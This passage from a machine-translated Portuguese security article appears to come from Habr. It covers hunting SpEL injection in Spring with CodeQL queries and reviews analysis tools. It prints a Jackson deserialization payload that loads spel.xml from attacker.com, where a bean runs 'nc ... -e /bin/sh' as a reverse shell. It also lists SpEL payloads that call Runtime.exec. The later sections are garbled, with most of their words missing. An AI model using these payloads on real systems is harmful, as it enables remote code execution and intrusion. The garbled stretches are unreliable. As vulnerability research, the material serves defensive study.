chamada √© considerada vulner√°vel.  Para n√≥s, essa √© qualquer classe que cont√©m um m√©todo que chama ExpressionParser. </p><br><p>  Em seguida, fazemos uma sele√ß√£o de todos os m√©todos que atendem aos nossos requisitos, por exemplo, descrevendo a ocorr√™ncia de uma vari√°vel em um m√©todo que higienizaria e a condi√ß√£o de n√£o se enquadrar nesse m√©todo. </p><br><p><img src="https://habrastorage.org/webt/or/cs/bu/orcsbusthzp51u1y_l0wuupohe8.png"></p><br><p>  Ent√£o, o que precisa ser feito para encontrar a vulnerabilidade do CVE 2018-1273? <br>  Ap√≥s receber e conectar a imagem do projeto, usamos o console QL para descrever a √°rvore de chamadas que nos interessa.  Para fazer isso: <br>  N√≥s descrevemos a classe do analisador Expression: </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">ExpressionParser</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">RefType</span></span></span><span class="hljs-class"> </span></span>{ ExpressionParser() { <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.hasQualifiedName(<span class="hljs-string"><span class="hljs-string">"org.springframework.expression"</span></span>, <span class="hljs-string"><span class="hljs-string">"ExpressionParser"</span></span>) } }</code> </pre> <br><p>  E os m√©todos que podem ser usados ‚Äã‚Äãpara execu√ß√£o na classe ExpressionParser: </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">ParseExpression</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">MethodAccess</span></span></span><span class="hljs-class"> </span></span>{ ParseExpression() { exists (Method m | (m.getName().matches(<span class="hljs-string"><span class="hljs-string">"parse%"</span></span>) or m.hasName(<span class="hljs-string"><span class="hljs-string">"doParseExpression"</span></span>)) and <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getMethod() = m ) } }</code> </pre> <br><p>  Agora voc√™ precisa conectar essas descri√ß√µes umas √†s outras e fazer uma sele√ß√£o: </p><br><pre> <code class="sql hljs">from ParseExpression expr where (expr.getQualifier().getType().(RefType).getASupertype*() instanceof ExpressionParser) <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> expr</code> </pre> <br><p>  Essa consulta retornar√° todos os m√©todos iniciados com an√°lise ou com o nome doParseExpression que pertencer√° √† classe ExpressionParser.  Mas isso √© demais, voc√™ diz, e estar√° certo.  √â necess√°rio um filtro. </p><br><p>  Porque  no c√≥digo, h√° um coment√°rio do formul√°rio: </p><br><pre> <code class="sql hljs">* Converts a patch path to an {@link Expression}. * * @param path the patch path to convert.</code> </pre> <br><p>  Pode ser, por exemplo, uma pesquisa por "caminho" em Javadoc.  O Spring comenta seu c√≥digo com uma qualidade muito alta, e podemos encontrar chamadas de m√©todo com o coment√°rio necess√°rio e, ao mesmo tempo, remover todos os m√©todos inclu√≠dos nos testes.  Tudo isso pode ser descrito da seguinte maneira: </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">CallHasPath</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Callable</span></span></span><span class="hljs-class"> </span></span>{ CallHasPath() { not <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getDeclaringType() <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">instanceof</span></span></span><span class="hljs-function"> TestClass </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">and</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">( </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">this</span></span></span></span><span class="hljs-function"><span class="hljs-params">.getDoc()</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getJavadoc</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">instanceof</span></span></span><span class="hljs-function"> DocHasPath or </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">this</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getDeclaringType</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getDoc</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getJavadoc</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">instanceof</span></span></span><span class="hljs-function"> DocHasPath ) } }</span></span></code> </pre> <br><p>  Em seguida, para combinar a classe, m√©todos e filtro por Javadoc, a consulta para a sele√ß√£o assumir√° o seguinte formato: </p><br><pre> <code class="sql hljs">from ParseExpression expr, CallHasPath c where (expr.getQualifier().getType().(RefType).getASupertype*() instanceof ExpressionParser and c = expr.getEnclosingCallable()) <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> expr, c</code> </pre> <br><p>  Este exemplo pode ser considerado simples e, em geral, redundante para procurar uma vulnerabilidade espec√≠fica.  Muito mais interessante √© a busca por erros ao escrever uma corre√ß√£o, porque  nele, voc√™ precisa especificar a pr√≥pria classe, respons√°vel pela verifica√ß√£o, os m√©todos que sempre a chamam e que s√£o executados antes de serem verificados. </p><br><p>  Uma chamada para um m√©todo que sempre chama CheckerPath: </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">VerifyPathCallerAccess</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">MethodAccess</span></span></span><span class="hljs-class"> </span></span>{ VerifyPathCallerAccess() { exists(VerifyPathActionConf conf | conf.callAlwaysPerformsAction(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>) ) or <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getMethod() <span class="hljs-keyword"><span class="hljs-keyword">instanceof</span></span> VerifyPath } }</code> </pre> <br><p>  Uma chamada para um m√©todo que √© executado antes de confirmPath: </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">UnsafeEvaluateCall</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">MethodAccess</span></span></span><span class="hljs-class"> </span></span>{ UnsafeEvaluateCall() { ( <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getMethod() <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">instanceof</span></span></span><span class="hljs-function"> Evaluate or </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">exists</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(UnsafeEvaluateCall unsafe | </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">this</span></span></span></span><span class="hljs-function"><span class="hljs-params">.getMethod()</span></span></span><span class="hljs-function"> </span></span>= unsafe.getEnclosingCallable() ) ) <span class="hljs-function"><span class="hljs-function">and not </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">exists</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(VerifyPathCallerAccess verify | dominates(verify, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">this</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function"> ) } }</span></span></code> </pre> <br><p>  Considere outra vulnerabilidade interessante.  O entendimento dela √© muito importante, porque  mostra que o erro pode estar em uma biblioteca de terceiros e demonstra como os beans anotados em XML podem ser usados. </p><br><h2 id="jackson-and-bean">  Jackson e feij√£o </h2><br><p>  CVE-2017-17485 √© baseado no uso de FileSystemXmlApplicationContext - √© um contexto de aplicativo independente na forma de XML, que recebe arquivos de defini√ß√£o de contexto do sistema de arquivos ou da URL. </p><br><p>  De acordo com a documenta√ß√£o, isso permite carregar beans de um arquivo e recarregar o contexto do aplicativo. <br>  "... Crie um novo FileSystemXmlApplicationContext, carregando as defini√ß√µes dos arquivos XML fornecidos e atualizando automaticamente o contexto" </p><br><p>  Jackson √© uma biblioteca que permite serializar e desserializar qualquer objeto, exceto aqueles que est√£o na lista negra.  Essa oportunidade √© frequentemente usada pelos atacantes.  No caso desta vulnerabilidade, o invasor precisou passar o objeto <code>org.springframework.context.support.FileSystemXmlApplicationContext</code> com um valor que cont√©m o caminho para o arquivo controlado pelo invasor. </p><br><p>  I.e.  no corpo da solicita√ß√£o, voc√™ pode transmitir o seguinte JSON: </p><br><pre> <code class="json hljs">{<span class="hljs-attr"><span class="hljs-attr">"id"</span></span>:<span class="hljs-number"><span class="hljs-number">123</span></span>, <span class="hljs-attr"><span class="hljs-attr">"obj"</span></span>: [<span class="hljs-string"><span class="hljs-string">"org.springframework.context.support.FileSystemXmlApplicationContext"</span></span>, <span class="hljs-string"><span class="hljs-string">"https://attacker.com/spel.xml"</span></span>]}</code> </pre> <br><p>  Spel.xml conter√° par√¢metros de bin: </p><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">beans</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.springframework.org/schema/beans"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns:xsi</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xsi:schemaLocation</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">bean</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"pb"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">class</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"java.lang.ProcessBuilder"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">constructor-arg</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">list</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value-type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"java.lang.String"</span></span></span><span class="hljs-tag"> &gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>nc<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>XXXX<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>9999<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>-e<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>/bin/sh<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">list</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">constructor-arg</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">property</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"whatever"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"#{pb.start()}"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">bean</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">beans</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>  Porque  Como usamos a classe java.lang.ProcessBuilder, que possui um m√©todo start, ap√≥s recarregar o contexto, o Spring l√™ a express√£o que inicia ProcessBuilder a partir da propriedade SpEL, for√ßando o servidor a se conectar a n√≥s usando nc. </p><br><p>  Vale a pena prestar aten√ß√£o ao spel.xml dado como exemplo, como  mostra como passar par√¢metros ao executar o comando. </p><br><p>  E de que outra maneira podemos carregar nosso bean ou recarregar o contexto? </p><br><p>  Mesmo com uma r√°pida olhada na documenta√ß√£o do Spring, voc√™ pode encontrar mais algumas classes que podem ser √∫teis para n√≥s. </p><br><p>  ClassPathXmlApplicationContext e AbstractXmlApplicationContext s√£o semelhantes ao FileSystem, mas os beans anotados em ClassPath e XML s√£o usados ‚Äã‚Äãcomo o caminho para a configura√ß√£o, respectivamente. </p><br><p>  H√° outro ponto interessante relacionado √† atualiza√ß√£o do contexto - @RefreshScope. </p><br><p>  Qualquer Spring Bean anotado com @RefreshScope ser√° atualizado no momento do lan√ßamento.  E todos os componentes que o usam receber√£o um novo objeto na pr√≥xima vez que o m√©todo for chamado, eles ser√£o totalmente inicializados e introduzidos, dependendo. </p><br><p>  RefreshScope √© um componente em contexto e possui um m√©todo p√∫blico refreshAll, projetado para atualizar todos os componentes em uma √°rea limpando o cache de destino.  Portanto, ao usar o @RefreshScope, o usu√°rio pode acessar um URL que termina em / atualizar e, assim, recarregar os beans anotados. </p><br><h2 id="drugie-utility">  Outras utilidades </h2><br><p>  Existem muitos outros plugins e programas que permitem analisar o c√≥digo e encontrar a vulnerabilidade. </p><br><ul><li>  Jprofiler - √© instalado como um aplicativo separado - servidor e plugin para IDE.  Permite analisar um aplicativo em execu√ß√£o.  √â muito conveniente analisar o comportamento dos objetos atrav√©s de gr√°ficos. </li></ul><br><p><img src="https://habrastorage.org/webt/g4/ki/ij/g4kiijoeylzhjo742es00a_ksti.png"></p><br><p>  Dos menos - pago, mas tem um per√≠odo gratuito de 10 dias.  √â considerado um dos melhores utilit√°rios para analisar o comportamento do aplicativo, n√£o apenas do ponto de vista da seguran√ßa. </p><br><ul><li>  Xrebel - pago, n√£o encontramos a possibilidade de um per√≠odo de teste.  Mas tamb√©m considerado um dos melhores. </li><li>  Cobertura - usa seus pr√≥prios servidores para an√°lise, portanto, √© conveniente apenas para aqueles que n√£o t√™m medo de definir seu c√≥digo. </li><li>  Checkmarx - muito famoso, pago, conhece muitas l√≠nguas e despeja muitos falsos positivos.  Mas √© melhor apontar para o lugar onde a teoria pode ter um erro do que perder um erro real. </li><li>  Verifica√ß√£o de Depend√™ncia OWASP - fornecida como um plug-in conveniente para v√°rios construtores.  Conseguimos test√°-lo para Maven e Ant ao analisar um aplicativo Java.  Tamb√©m suporta .Net.  De acordo com os resultados do trabalho, ele fornece um relat√≥rio conveniente indicando bibliotecas obsoletas e vulnerabilidades conhecidas por eles. </li><li>  Findbugs - j√° foi mencionado anteriormente.  Possui muitas implementa√ß√µes, mas a op√ß√£o findbugs_cli acabou sendo a mais conveniente e, por algum motivo, mostrando mais problemas.  Pode ser usado da seguinte maneira: <br><pre> <code class="bash hljs">findsecbugs.bat -progress -html -output report_name.htm <span class="hljs-string"><span class="hljs-string">"path\example.jar"</span></span></code> </pre> </li><li>  LGTM QL - Um exemplo de seu uso j√° foi dado anteriormente.  Gostar√≠amos de dizer separadamente que tamb√©m h√° um caso de uso pago, ap√≥s o qual voc√™ receber√° um servidor local para analisar seu c√≥digo. <br> QL    Java,             . </li></ul><br><h1 id="black-box"> Black Box </h1><br><p>  -,   . <br>  ,    : Spring,     SpEL, ,  SpEL API,   -,        . </p><br><p>         spring,      URL,    API.        /metrics  /beans ‚Äî     Spring Boot Actuator     ,        . </p><br><p>  ,    . </p><br><p>    , SpEL      ,     ,    . </p><br><ul><li>  : <code>var[SpEL]=123</code> </li><li>  : <code>&amp;variable1=123&amp;SpEL=</code> </li><li> : org.springframework.cookie = <code>${}</code> </li><li>     .. </li></ul><br><h2 id="vot-nebolshaya-podborka-s-variantami-peylodov">      : </h2><br><pre> <code class="javascript hljs">${<span class="hljs-number"><span class="hljs-number">1</span></span>+<span class="hljs-number"><span class="hljs-number">3</span></span>} T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string"><span class="hljs-string">"nslookup !url!"</span></span>) #<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getClass().forName(<span class="hljs-string"><span class="hljs-string">'java.lang.Runtime'</span></span>).getRuntime().exec(<span class="hljs-string"><span class="hljs-string">'nslookup !url!'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> java.lang.ProcessBuilder({<span class="hljs-string"><span class="hljs-string">'nslookup !url!'</span></span>}).start() ${user.name}</code> </pre> <br><h1 id="ne-spelom-ediny">  SpEL  </h1><br><p>    SpEL    ,   ,     EL Injection.    : OGNL, MVEL, JBoss EL, JSP EL.   -        . </p><br><h1 id="v-kachestve-zaklyucheniya">    </h1><br><p>  ZeroNights  : ‚Äú ,  Spring,   SpEL injection?‚Äù </p><br><p>   ,    CVE,   .       ,     ,   github. </p><br><p>  ,   ,            SpEL Expression.  I.e.  (,   )        ,      . </p><br><p>  I.e.            .      ,          ,       ‚Äú‚Äù . </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt433034/">https://habr.com/ru/post/pt433034/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt433014/index.html">Piadas sobre o recente lan√ßamento de astronautas no espa√ßo sideral</a></li>
<li><a href="../pt433016/index.html">Altera√ß√µes na interface, anima√ß√£o em camadas e caos visual estruturado: uma revis√£o das tend√™ncias da web para 2019</a></li>
<li><a href="../pt433018/index.html">UDB. O que √© isso? Parte 2. Caminho de Dados</a></li>
<li><a href="../pt433030/index.html">Ao vivo: desempenho front-end</a></li>
<li><a href="../pt433032/index.html">Como o roteamento m√©dico funciona - mostramos o exemplo do aplicativo DOC +</a></li>
<li><a href="../pt433036/index.html">Dicas para organizar a TI em uma pequena empresa</a></li>
<li><a href="../pt433038/index.html">Por que os profissionais de marketing aprendem programa√ß√£o</a></li>
<li><a href="../pt433042/index.html">Intel lan√ßar√° o processador com arquitetura tridimensional Foveros em 2019</a></li>
<li><a href="../pt433044/index.html">O c√≥digo fonte do OpenJDK cont√©m muitos palavr√µes</a></li>
<li><a href="../pt433046/index.html">Toda a verdade sobre o RTOS. Artigo 25. Canais de Dados: Introdu√ß√£o e Servi√ßos B√°sicos</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>